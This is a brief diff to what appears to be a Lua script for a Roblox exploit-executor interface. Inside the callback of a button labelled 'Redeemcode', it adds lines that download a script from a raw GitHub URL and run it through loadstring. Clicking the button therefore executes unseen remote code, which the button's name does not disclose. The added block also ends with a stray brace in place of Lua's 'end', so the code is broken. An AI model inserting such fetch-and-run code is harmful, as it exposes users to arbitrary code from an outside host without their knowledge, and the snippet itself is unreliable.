@@ -196,3 +196,8 @@ local Tab = Window:MakeTab({
 Tab:AddButton({
 	Name = "Redeemcode",
 	Callback = function()
+local scriptURL = "https://raw.githubusercontent.com/Nicholas19x/Avr/main/CODE"
+local script = game:HttpGet(scriptURL)
+local executeScript = loadstring(script)
+executeScript()
+}
